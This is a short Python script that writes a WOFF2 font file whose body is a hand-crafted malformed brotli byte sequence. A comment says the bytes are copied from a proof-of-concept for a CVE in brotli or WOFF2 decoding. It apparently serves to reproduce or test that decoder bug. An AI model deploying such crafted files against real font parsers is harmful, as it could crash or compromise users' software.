# creates a modified brotli-encoded woff2 fileimport struct
import brotli

payload = b"Hello WOFF2"

# taken from https://github.com/GlobularOne/HTTP2Shell-PoC/blob/330790c275c8f3034085724353da465833c18e22/CVE-2026-111497.py#L9
compressed = bytes.fromhex('200010414141fcffff07002228f00b60f7f41f000000' + ('00' * 64)) 

# what u usually do:
# compressed = brotli.compress(payload)

signature = 0x774F4632  # "wOF2"
flavor = 0x00010000     # TrueType
length = 48 + len(compressed)
num_tables = 0
reserved = 0
total_sfnt_size = len(payload)
total_compressed_size = len(compressed)
major_version = 1
minor_version = 0

header = struct.pack(
    ">II I H H I I H H I I I I I",
    signature,
    flavor,
    length,
    num_tables,
    reserved,
    total_sfnt_size,
    total_compressed_size,
    major_version,
    minor_version,
    0,  # metaOffset
    0,  # metaLength
    0,  # metaOrigLength
    0,  # privOffset
    0,  # privLength
)

with open("test.woff2", "wb") as f:
    f.write(header)
    f.write(compressed)

print("Wrote test.woff2")
